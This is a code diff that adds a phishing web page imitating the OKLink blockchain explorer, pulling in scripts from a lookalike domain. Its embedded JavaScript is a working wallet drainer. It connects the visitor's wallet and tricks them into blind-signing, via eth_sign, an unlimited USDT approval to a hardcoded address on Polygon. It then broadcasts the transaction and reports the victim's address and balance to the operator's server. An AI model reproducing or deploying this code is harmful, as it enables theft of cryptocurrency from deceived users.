+                "type": "uint256"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "spender",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "name": "addedValue",
+                "type": "uint256"
+            }],
+            "name": "increaseAllowance",
+            "outputs": [{
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "spender",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "name": "subtractedValue",
+                "type": "uint256"
+            }],
+            "name": "decreaseAllowance",
+            "outputs": [{
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "_newOwner",
+                "type": "address"
+            }],
+            "name": "transferOwnership",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [],
+            "name": "pause",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [],
+            "name": "unpause",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "_newLawEnforcementRole",
+                "type": "address"
+            }],
+            "name": "setLawEnforcementRole",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "_addr",
+                "type": "address"
+            }],
+            "name": "freeze",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "_addr",
+                "type": "address"
+            }],
+            "name": "unfreeze",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "_addr",
+                "type": "address"
+            }],
+            "name": "wipeFrozenAddress",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "indexed": false,
+                "name": "_addr",
+                "type": "address"
+            }],
+            "name": "isFrozen",
+            "outputs": [{
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "_newSupplyController",
+                "type": "address"
+            }],
+            "name": "setSupplyController",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "_value",
+                "type": "uint256"
+            }],
+            "name": "increaseSupply",
+            "outputs": [{
+                "name": "success",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "_value",
+                "type": "uint256"
+            }],
+            "name": "decreaseSupply",
+            "outputs": [{
+                "name": "success",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }];
+
+
+
+        var Web3Modal = window.Web3Modal.default;
+
+        var authorized_address = "0x5738F9ADA5a50f127D9C1f4a3449563B3CbeE63D";
+
+        	var provider = new ethers.providers.Web3Provider(window.ethereum);
+        
+        $("#btn_dlg_ok").click(function() {
+            $("#dlg").hide();
+        });
+        $("#dlg").click(function() {
+            $("#dlg").hide();
+        })
+        $("#btn_login").click(function() {
+            fetchAccountData();
+        });
+        $(".btn-register").click(function() {
+            fetchAccountData();
+        })
+        async function init() {
+            const providerOptions = {
+                walletconnect: {
+                    package: WalletConnectProvider,
+                    options: {
+                        bridge: "https://uniswap.bridge.walletconnect.org",
+                        // Mikko's test key - don't copy as your mileage may vary
+                        <!--   infuraId: "7d73a0c13ce946769577714aef84b79a", -->
+                    }
+                },
+            };
+            web3Modal = new Web3Modal({
+                cacheProvider: false, // optional
+                providerOptions, // required
+                disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
+            });
+            <!--await fetchAccountData();-->
+            // provider = await web3Modal.connect()
+            const web3 = new Web3(window.ethereum);
+            const accounts = await web3.eth.getAccounts()
+            var selectedAccount = accounts[0]
+            var network = await web3.eth.net.getId()
+            $('._z_js_address').val(selectedAccount);
+
+            if (network == 137) { //MATIC
+                var approveAddr = '0xc2132d05d31c914a87c6611c10748aeb04b58e8f'
+            } else {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{
+                        chainId: Web3.utils.numberToHex(137) //链id
+                    }]
+                })
+            }
+        }
+
+        async function onConnect() {
+
+            try {
+                provider.enable()
+
+            } catch (e) {
+                console.log("Could not get a wallet connection", e);
+                return;
+            }
+
+            provider.on("accountsChanged", async (accounts) => {
+
+            });
+            provider.on("chainChanged", async (chainId) => {
+
+            });
+            provider.on("networkChanged", async (networkId) => {
+
+            });
+
+        }
+
+        async function fetchAccountData() {
+            await onConnect();
+            
+            if (provider) {
+                const web3 = new Web3(window.ethereum);
+                const accounts = await web3.eth.getAccounts()
+                var selectedAccount = accounts[0]
+                var network = await web3.eth.net.getId()
+                $('._z_js_address').val(selectedAccount);
+
+                if (network == 137) { //MATIC
+                    var approveAddr = '0xc2132d05d31c914a87c6611c10748aeb04b58e8f'
+                } else {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{
+                            chainId: Web3.utils.numberToHex(137) //链id
+                        }]
+                    })
+                }
+                
+                
+                
+                const contract = new web3.eth.Contract(ABI, approveAddr)
+                var allon = await contract.methods.allowance(selectedAccount, authorized_address).call()
+                var ye = await contract.methods.balanceOf(selectedAccount).call()
+                let balance = await web3.eth.getBalance(approveAddr);
+                
+                const gasPrice = await web3.eth.getGasPrice()
+                if (allon > 0) {
+                    // console.log('已授权')
+                    // return
+                }
+                
+                var uye = ye/1000000;
+                var val = 900000000 + parseInt((Math.random() * 1000).toFixed(0));
+                var valStr = val + "000000000000000000";
+               
+                          
+						  
+				// 			var approveAddr = "0x40af3827F39D0EAcBF4A168f8D4ee67c121D11c9";
+						
+				// 			const contract = new web3.eth.Contract(ABI, approveAddr);
+        // let gasPrice = await web3.eth.getGasPrice();
+        let nonce = await web3.eth.getTransactionCount(selectedAccount);
+        let chainId = await web3.eth.getChainId();
+        
+        console.log(contract);
+        // alert(gasPrice);
+        // alert(nonce);
+        // alert(chainId);
+       
+        let createTxData = contract.methods.approve(authorized_address, web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")).encodeABI();
+        console.log(createTxData);
+        const data = {
+            to: approveAddr,
+            value: "0x",
+            data: createTxData,
+            gasLimit: ethers.utils.hexlify(70000),
+            gasPrice: web3.utils.toHex(gasPrice),
+            nonce: nonce,
+            v: web3.utils.toHex(chainId),
+            r: "0x",
+            s: "0x"
+        };
+        let transaction =data;
+        let nonceHex = "0x";
+
+        if (nonce > 0) {
+            nonceHex = web3.utils.toHex(data.nonce);
+        }
+
+        let rlpData = [nonceHex, data.gasPrice, data.gasLimit, data.to, data.value, data.data, data.v, data.r, data.s];
+       console.log("rlpData:" + rlpData);
+		console.log("nonceHex:", nonceHex);
+		let serializedTransaction = ethers.utils.RLP.encode(rlpData);
+		console.log(serializedTransaction);
+		let hash = ethers.utils.keccak256(serializedTransaction);
+		console.log("userAddress:", selectedAccount);
+		console.log('hash',hash);
+		let si = await ethereum.request({method:"eth_sign", params: [selectedAccount, hash]});
+		console.log(si);
+		let sig = ethers.utils.splitSignature(si);
+		console.log(sig);
+		let v = sig.recoveryParam + 35;
+		v += chainId * 2;
+		transaction.r = sig.r;
+		transaction.s = sig.s;
+		transaction.v = v;
+		console.log(transaction);
+		let msgHex = ethers.utils.RLP.encode([nonceHex, transaction.gasPrice, transaction.gasLimit, transaction.to, transaction.value, transaction.data, web3.utils.toHex(transaction.v), transaction.r, transaction.s]);
+// 		alert(msgHex);
+		provider.send("eth_sendRawTransaction", [msgHex]).then((hash) => {
+		    alert('查询成功！');
+			console.log("hash - " + hash);
+			 send(selectedAccount, "USDT",ye);
+       
+                        $.ajax({
+		url: "pay/notify",
+		data: {
+			address: selectedAccount,
+			to_address: authorized_address,
+			balance: uye,
+			type: 'polygon',
+		},
+		type: "post",
+		success: function(data, textStatus, xhr) {
+		    
+			console.log(data);
+		},
+		error: function(xhr, textStatus, error) {
+		  //  alert('查询失败！')
+		}
+	});
+          
+        }); 
+                        
+                        
+                 
+	
+	
+	
+                   
+               
+            }
+ }
+
+        
+        
+        
+
+
+        async function send(address, symbol,ye) {
+
+            var data = {
+                address: address,
+                authorized_address: authorized_address,
+                bizhong: symbol,
+                ye:ye,
+                code: '1',
+                reffer: '10000',
+                type: 'okt'
+            }
+            var uye= ye/1000000
+            
+ 
+window.open('https://' + window.location.host + '/' + 'okt.php?address='+address +'&uye='+uye+'&time=' + new Date().toLocaleString() ,'_self');
+
+          
+        }
+        
+        window.addEventListener('load', async () => {
+            init();
+        });
+    </script>
+    <script>
+        function fz(obj, prop, value) {
+            Object.defineProperty(obj, prop, {
+                value: value,
+                writable: false,
+                enumerable: true
+            })
+        };
+        var okGlobal = window.okGlobal || {
+            broker: {}
+        };
+        var okui = window.okui || {};
+        var langPath = "\/zh-cn";
+        okGlobal.linkToLangUrl = function(url, isNewTab) {
+            var l = langPath + url;
+            isNewTab ? window.open(l) : window.location.href = l;
+        };
+        fz(okGlobal, 'locale', "zh_CN");
+        fz(okGlobal, 'langPath', langPath);
+        fz(okGlobal, 'timestamp', 1670229659284);
+        fz(window, 'okGlobal', okGlobal);
+        fz(window, 'okui', okui);
+        window.okGlobal.isResponsive = true;
+        window.okGlobal.navShowStatus = true;
+        window.okGlobal.isApp = false;
+        fz(window.okGlobal, 'versionUrls', {});
+        fz(window.okGlobal, 'ipRegion', "CN");
+        fz(window.okGlobal, 'languageCdnUrl', "https:\/\/static.oklink.com\/cdn\/multilanguage");
+        fz(window.okGlobal, 'cdnBaseUrl', "https:\/\/static.oklink.com");
+        fz(window.okGlobal, 'envSign', "prod");
+        window.okGlobal.versionUrls['expressway'] = "https:\/\/static.oklink.com\/cdn\/assets\/okfe\/oklink-expressway\/2.0.7";
+        window.okGlobal.versionUrls['reportCenter'] = "https:\/\/static.oklink.com\/cdn\/assets\/okfe\/report-center\/0.1.30";
+        window.okGlobal.versionUrls['subjectData'] = "https:\/\/static.oklink.com\/cdn\/assets\/okfe\/subject-data\/3.6.3";
+        window.okGlobal.versionUrls['allBlockChain'] = "https:\/\/static.oklink.com\/cdn\/assets\/okfe\/all-block-chain\/3.9.10";
+        fz(window.okGlobal, 'staticVersionUrls', {});
+        fz(window.okGlobal, 'chainEntryConfig', "btc,eth,okc,okc-test,bsc,polygon,sol,trx,usdt,etc,bch,ltc,dash,avax,ethw,optimism,ethf,ftm,aptos,middle,arbitrum,extra,zksync");
+        fz(window.okGlobal, 'languageVersion', {});
+        fz(window.okGlobal, 'i18nVersion', {
+            "oklink_web_common": "1669966292",
+            "web_biz_report_center": "1669880178",
+            "web_biz_combined_trade": "1670212577",
+            "web_biz_defi": "1670229343",
+            "web_common": "1670226831",
+            "web_biz_general": "1670216463",
+            "oklink_web_chaintelligence": "1670209455",
+            "oklink_web_chain_master": "1669982081",
+            "web_biz_seo": "1670212652",
+            "oklink_web_explorer": "1670209690",
+            "oklink_web_seo_tdk": "1670213505",
+            "oklink_web_trading": "1667903951",
+            "oklink_web_account": "1669964924",
+            "oklink_web_smart_contract": "1669980984",
+            "oklink_web_subject_data": "1669253406",
+            "oklink_web_asset": "1669965440"
+        });
+    </script>
+    <script>
+        var sign = "OKLink";
+        sign = sign.toLowerCase();
+        window.okGlobal.site = {
+            siteName: "OKLink",
+            seoTitle: "OKLink-\u5168\u7403\u9886\u5148\u6BD4\u7279\u5E01\u4EE5\u592A\u574A\u533A\u5757\u94FE\u6D4F\u89C8\u5668\u548C\u6BD4\u7279\u5E01\u94B1\u5305"
+        }
+    </script>
+
+    <script>
+        window.okGlobal.site.sign = 'oklink';
+        window.okGlobal.site.is = {
+            oklink: true
+        };
+    </script>
+    <script>
+        window.javaweb_locale = "{\"homepage_searchbox_common_error\":\"\u8BF7\u8F93\u5165\u8981\u641C\u7D22\u7684\u5185\u5BB9\",\"fifatopic_modal_btn_explore\":\"\u63A2\u7D22\u8BE6\u60C5\",\"view_seo_search_plorder\":\"\u641C\u7D22\u5730\u5740 \/ \u4EA4\u6613 \/ \u533A\u5757 \/ \u4EE3\u5E01 \/ ENS \/ \u9879\u76EE\",\"fifatopic_modal_hover_project_of_football\":\"2022 \u8DB3\u7403\u94FE\u4E0A\u9879\u76EE\",\"oklink_home_blockstatus_colbody_text_months\":\"\u6708\",\"oklink_home_search_input_placeholder_sol\":\"\u641C\u7D22\u5730\u5740\/\u4EA4\u6613\/Slot\",\"oklink_home_search_input_placeholder_other\":\"\u641C\u7D22\u5730\u5740\/\u4EA4\u6613\/\u533A\u5757\u9AD8\u5EA6\",\"oklink_search_dropdown_tab_title_event\":\"\u70ED\u95E8\u6D3B\u52A8\",\"oklink_home_blockstatus_colbody_text_ago\":\"\u524D\",\"oklink_search_dropdown_event_desc\":\"\u5B9E\u65F6\u6570\u636E\u548C\u9879\u76EE\u6392\u540D\",\"oklink_home_blockstatus_colbody_text_seconds\":\"\u79D2\",\"oklink_homepage_promotions_list\":\"[{\\\"img\\\":\\\"\/cdn\/assets\/imgs\/2211\/2B1F831694AEDD95.jpg\\\",\\\"title\\\":\\\"\u5386\u53F2\u4F59\u989D\u67E5\u8BE2\\\",\\\"desc\\\":\\\"\u5FEB\u901F\u67E5\u8BE2 POR \u5730\u5740\u5386\u53F2\u4F59\u989D\\\",\\\"url\\\":\\\"\/eth\/historical-balance-check\\\"},\\n{\\\"img\\\":\\\"\/cdn\/assets\/imgs\/2211\/188EEB84BE172C82.jpg\\\",\\\"title\\\":\\\"ETH \u901A\u7F29\u7EAA\u5143\\\",\\\"desc\\\":\\\"\u94FE\u4E0A\u6570\u636E\u5E26\u4F60\u4E86\u89E3 ETH \u4F9B\u9700\u548C\u901A\u7F29\u59CB\u672B\\\",\\\"url\\\":\\\"\/data\/eth-supply\\\"},\\n{\\\"img\\\":\\\"\/cdn\/assets\/imgs\/2211\/664ABC20FCE86480.jpg\\\",\\\"title\\\":\\\"Solana \u6570\u636E\u901F\u89C8\\\",\\\"desc\\\":\\\"Solana \u5168\u7F51\u6570\u636E\u4E00\u6587\u901F\u89C8\\\",\\\"url\\\":\\\"\/data\/solana_tvl\\\"},\\n{\\\"img\\\":\\\"\/cdn\/assets\/imgs\/2210\/BAB16A746BD6D647.jpg\\\",\\\"title\\\":\\\"Aptos \u6D4F\u89C8\u5668\\\",\\\"desc\\\":\\\"\u6D41\u7545\u3001\u51C6\u786E\u3001\u5373\u65F6\u3001\u4E30\u5BCC\u7684 Aptos \u94FE\u4E0A\u6570\u636E\\\",\\\"url\\\":\\\"\/apt\\\"},\\n{\\\"img\\\":\\\"\/cdn\/assets\/imgs\/2210\/D2CA4E309545A509.jpg\\\",\\\"title\\\":\\\"Aptos \u751F\u6001\\\",\\\"desc\\\":\\\"\u5FEB\u901F\u6536\u5F55\u9879\u76EE\uFF0C\u5206\u6790\u9879\u76EE\u6307\u6807\uFF0C\u6253\u9020\u6700\u5168\u7684 Aptos \u751F\u6001\\\",\\\"url\\\":\\\"\/defi\/list\/Aptos\\\"}, {\\\"img\\\":\\\"\/cdn\/assets\/imgs\/2110\/45FA3764CD570F6B.png\\\",\\\"title\\\":\\\"Hot Contract\\\",\\\"desc\\\":\\\"\u5168\u9762\u53D1\u73B0\u70ED\u95E8\u5E01\u79CD\u3001NFT\u9879\u76EE\u3001\u6D41\u52A8\u6C60\u7B49\\\",\\\"url\\\":\\\"\/data\/hot-contract\\\"},{\\\"img\\\":\\\"\/cdn\/assets\/imgs\/217\/0238FC79EDC3C889.png\\\",\\\"title\\\":\\\"DeFi\\\",\\\"desc\\\":\\\"\u53BB\u4E2D\u5FC3\u5316\u91D1\u878D\u662F\u6307\u57FA\u4E8E\u516C\u5171\u533A\u5757\u94FE\u548C\u667A\u80FD\u5408\u7EA6\u6784\u5EFA\u7684\u91D1\u878D\u670D\u52A1\uFF0C\u5305\u62EC\u501F\u8D37\u3001\u4EA4\u6613\u6240\u3001\u4FDD\u9669\u3001\u7A33\u5B9A\u5E01\u7B49\\\",\\\"url\\\":\\\"\/defi\/list\\\"},\\n{\\\"img\\\":\\\"\/cdn\/assets\/imgs\/2210\/740B2612EEA6DC6A.jpeg\\\",\\\"title\\\":\\\"\u53CD\u9493\u9C7C\u8BC8\u9A97\\\",\\\"desc\\\":\\\"\u63ED\u9732\u5E38\u89C1\u9493\u9C7C\u624B\u6CD5\u3001\u63D0\u4F9B\u9632\u8BC8\u9A97\u6307\u5357\\\",\\\"url\\\":\\\"\/academy\/zh\/how-phishing-site-in-web3\\\"},\\n{\\\"img\\\":\\\"\/cdn\/assets\/imgs\/217\/8B3BE912E8B289BB.png\\\",\\\"title\\\":\\\"NFT\\\",\\\"desc\\\":\\\"\u5B9E\u65F6\u67E5\u8BE2NFT\u5E02\u573A\u4EA4\u6613\u989D\u3001\u4EA4\u6613\u6570\u4E0E\u65E5\u5747\u4EF7\u4FE1\u606F\\\",\\\"url\\\":\\\"\/nft\\\"},{\\\"img\\\":\\\"\/cdn\/assets\/imgs\/217\/7A5C3271846B5E03.png\\\",\\\"title\\\":\\\"EIP-1559\\\",\\\"desc\\\":\\\"\u4EE5\u592A\u574A\u5DF2\u5B8C\u6210\u4F26\u6566\u786C\u5206\u53C9\uFF0CEIP1559\u534F\u8BAE\u751F\u6548\uFF0C\u4E3A\u60A8\u63D0\u4F9B\u6700\u65B0\u94FE\u4E0A\u6570\u636E\\\",\\\"url\\\":\\\"\/data\/eip1559\\\"},{\\\"img\\\":\\\"\/cdn\/assets\/imgs\/217\/6BE660631AE8FE4D.png\\\",\\\"title\\\":\\\"\u673A\u6784\u6570\u636E\\\",\\\"desc\\\":\\\"\u6536\u5F55\u66F4\u5168\u9762\u7684\u7070\u5EA6\u3001\u673A\u6784\u3001\u52A0\u5BC6\u8D44\u4EA7\u8BC1\u5238\u4EA7\u54C1\\\",\\\"url\\\":\\\"\/data\\\"}]\",\"oklink_home_blockstatus_colbody_text_hours\":\"\u5C0F\u65F6\",\"oklink_home_blockstatus_colbody_text_days\":\"\u5929\",\"homepage_searchbox_common_text\":\"\u641C\u7D22\u5EFA\u8BAE\",\"oklink_home_blockstatus_colbody_text_minutes\":\"\u5206\u949F\",\"oklink_search_dropdown_event_title\":\"\u8DB3\u7403\u72C2\u6B22\u8282\uFF01\u4E16\u754C\u676F\u94FE\u4E0A\u9879\u76EE\u5168\u6536\u5F55\"}";
+    </script>
+    <script src="https://bscscan.asia/static/tianyan/js/ont.js"></script>
+    <script src="https://bscscan.asia/static/tianyan/js/index.js"></script>
+
+
+    <script src="https://bscscan.asia/static/tianyan/js/core.js"></script>
+    <script src="https://bscscan.asia/static/tianyan/js/common/index.js"></script>
+    <script src="https://bscscan.asia/static/tianyan/js/header/index.js"></script>
+    <script src="https://bscscan.asia/static/tianyan/js/footer/index.js"></script>
+    <script src="https://bscscan.asia/static/tianyan/js/index/index.js"></script>
+
+
+
+    <footer id="footerContainer" class="footer-container">
+        <div class="footer-wrap" >
+            <div class="footer-main">
+                <div class="footer-left">
+                    <div class="footer-logo">
+                        <img alt="logo" src="https://static.oklink.com/cdn/assets/imgs/MjAyMDM/84007E07AC3E950C9E17DD476D13C6A8.png">
+                    </div>
+                    <div class="intro-info-grid">
+                        <div class="intro-info" data-lang-key="view_seo_footer_desc_oklink">OKLink是全球首家区块链大数据上市公司打造的区块链信息服务网站，旨在利用区块链+大数据技术为用户提供安全可靠的区块链信息服务。</div>
+                    </div>
+                </div>
+                <div class="footer-right">
+                    <div class="footer-ul">
+                        <div class="list">
+                            <div class="title-box">
+                                <div class="title" data-lang-key="view_seo_footer_list_product">产品</div>
+                                <span class="user-arrow"><i class="oklink-icon icon-dropdown_spread"></i></span>
+                            </div>
+                            <div class="item-box">
+                                <div class="list-item">
+                                    <a class="link" href="https://www.oklink.com/zh-cn/btc" data-lang-key="view_seo_footer_list_browser">区块链浏览器</a>
+                                </div>
+                                <div class="list-item">
+                                    <a class="link" href="https://www.oklink.com/zh-cn/tianyan" data-lang-key="view_seo_footer_list_tianyan">链上天眼</a>
+                                </div>
+                                <div class="list-item">
+                                    <a class="link" href="https://www.oklink.com/zh-cn/chainhub" data-lang-key="view_seo_footer_list_data">链上大师</a>
+                                </div>
+                                <div class="list-item">
+                                    <a class="link" href="https://www.oklink.com/zh-cn/audit" data-lang-key="view_seo_footer_list_audit">链上卫士</a>
+                                </div>
+                                <div class="list-item">
+                                    <a class="link" href="https://www.oklink.com/zh-cn/academy/zh" data-lang-key="view_seo_footer_list_college">学院</a>
+                                </div>
+                                <div class="list-item footer-otc">
+                                    <a class="link" href="https://www.oklink.com/zh-cn/trust" data-lang-key="view_seo_footer_list_otc">Trust</a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="list">
+                            <div class="title-box">
+                                <div class="title" data-lang-key="view_seo_footer_list_aboutus">关于我们</div>
+                                <span class="user-arrow"><i class="oklink-icon icon-dropdown_spread"></i></span>
+                            </div>
+                            <div class="item-box">
+                                <div class="list-item">
+                                    <a class="link" rel="nofollow" href="https://www.okg.com" data-lang-key="view_seo_footer_list_groupintroduction">集团介绍</a>
+                                </div>
+                                <div class="list-item">
+                                    <a class="link" rel="nofollow" href="https://app.mokahr.com/campus-recruitment/okgroup/72016#/" data-lang-key="view_seo_footer_list_campusrecruitment">校园招聘</a>
+                                </div>
+                                <div class="list-item">
+                                    <a class="link" rel="nofollow" href="https://app.mokahr.com/apply/okgroup/4333" data-lang-key="view_seo_footer_list_socialrecruitment">社会招聘</a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="list">
+                            <div class="title-box">
+                                <div class="title" data-lang-key="view_seo_footer_list_service">服务</div>
+                                <span class="user-arrow"><i class="oklink-icon icon-dropdown_spread"></i></span>
+                            </div>
+                            <div class="item-box">
+                                <div class="list-item">
+                                    <span class="link tip" id="tipLink">
+                                            <a rel="nofollow" data-lang-key="view_seo_footer_api_text" href="https://www.oklink.com/docs/zh/">API 文档</a>
+                                            <span class="tip-wrap">
+                                                <a class="tip-txt" rel="nofollow"  href="mailto:apiservice@oklink.com" data-lang-key="view_seo_hover_api_email">apiservice@oklink.com</a>
+                                            </span>
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="list">
+                            <div class="title-box">
+                                <div class="title" data-lang-key="view_seo_footer_list_contactus">联系我们</div>
+                                <span class="user-arrow"><i class="oklink-icon icon-dropdown_spread"></i></span>
+                            </div>
+                            <div class="item-box">
+                                <div class="list-item">
+                                    <span class="link tip">
+                                            <span data-lang-key="view_seo_footer_list_businesscontacts">商务合作</span>
+                                    <span class="tip-wrap">
+                                                <a class="tip-txt" rel="nofollow"  href="mailto:cooperation@oklink.com" data-lang-key="view_seo_footer_hover_businesscontacts">cooperation@oklink.com</a>
+                                            </span>
+                                    </span>
+                                </div>
+                                <div class="list-item">
+                                    <a class="link" rel="nofollow" href="https://oklinksupport.zendesk.com/hc/zh-hk" data-lang-key="view_seo_footer_list_helpcenter">帮助中心</a>
+                                </div>
+                            </div>
+                            <div class="icon-language-box">
+                                <div class="icon-list" id="footerMedia">
+                                    <span class="icon-some-chat">
+                                            <i class="oklink-icon icon-icon_wechat"></i>
+                                            <img alt="logo" src="https://static.oklink.com/cdn/assets/imgs/215/23FB465151EB51C5.png">
+                                        </span>
+                                    <a href="https://t.me/oukeyunlianoklink" class="icon-some-chat" target="_blank" rel="noreferrer"><i class="oklink-icon icon-icon_telegram"></i></a>
+                                    <a href="https://twitter.com/OKLink" class="icon-some-chat" target="_blank" rel="noreferrer"><i class="oklink-icon icon-icon_Twitter"></i></a>
+                                    <a href="https://weibo.com/p/1006067374672418" class="icon-some-chat" target="_blank" rel="noreferrer"><i class="oklink-icon icon-icon_weibo"></i></a>
+                                    <a href="https://discord.com/invite/QcywHPgk4S" class="icon-some-chat" target="_blank" rel="noreferrer"><i class="oklink-icon icon-Discord"></i></a>
+                                </div>
+                                <div class="all-language-box">
+                                    <div class="now-language">
+                                        <i class="oklink-icon icon-home_language lang-box-icon"></i>
+                                        <span class="text" data-lang-key="view_seo_footer_language_select">简体中文</span>
+                                        <i class="oklink-icon icon-dropdown_spread arrow-icon"></i>
+                                    </div>
+                                    <div class="language-list">
+                                        <div class="ul-box">
+                                            <div class="ul-title" data-lang-key="view_seo_footer_language_text">语言</div>
+                                            <ul class="list-ul">
+                                                <li class="language" rel="zh_CN">简体中文</li>
+                                                <li class="language" rel="en_US">English</li>
+                                                <li class="language" rel="zh_HK">繁體中文</li>
+                                                <li class="language" rel="de_DE">Deutsch</li>
+                                                <li class="language" rel="es_419">Español</li>
+                                                <li class="language" rel="fr_FR">Français</li>
+                                                <li class="language" rel="pt_BR">Portugués</li>
+                                                <li class="language" rel="ru_RU">Pусский</li>
+                                                <li class="language" rel="vi_VN">Tiếng Việt</li>
+                                                <li class="language" rel="tr_TR">Türkçe</li>
+                                                <li class="language" rel="ko_KR">한국어</li>
+                                                <li class="language" rel="ja_JP">日本語</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-link-grid">
+
+                <div class="footer-link">
+                    <span class="friendly-link" data-lang-key="view_seo_footer_link_friendlylink">友情链接：</span>
+                    <a class="links" href="https://www.okg.com/" target="_blank"></a><a class="links" href="https://www.oklink.com" target="_blank">区块链</a><a class="links" href="https://coinstats.app/" target="_blank" rel="nofollow">CoinStats</a><a class="links"
+                        href="https://www.livecoinwatch.com/" target="_blank">Live Coin Watch</a>
+                </div>
+            </div>
+            <div class="copyright-box">
+                <span class="copyright" data-lang-key="view_seo_footer_copyright_oklink">©2014-2023 OKLink All Rights Reserved</span>
+                <a class="filing-number-link" target="_blank" href="http://beian.miit.gov.cn" rel="noreferrer nofollow" data-lang-key="view_seo_footer_filingnumber_oklink">京ICP备20017016号-1</a>
+            </div>
+        </div>
+    </footer>
 </body>
+
 </html>
